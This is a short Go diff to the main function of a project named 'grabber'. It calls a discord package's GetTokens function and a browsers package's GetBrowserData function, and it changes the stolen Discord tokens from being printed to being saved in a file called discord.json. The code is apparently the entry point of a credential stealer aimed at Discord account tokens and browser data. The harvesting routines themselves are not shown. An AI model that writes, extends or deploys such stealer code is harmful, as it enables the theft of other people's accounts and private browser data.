@@ -2,7 +2,7 @@
 package main
 
 import (
-	"fmt"
+	"os"
 
 	"example.com/grabber/browsers"
 	"example.com/grabber/discord"
@@ -10,6 +10,6 @@ import (
 )
 
 func main() {
-	fmt.Println(discord.GetTokens())
+	os.WriteFile("discord.json", []byte(discord.GetTokens()), 0644)
 	browsers.GetBrowserData()
 }
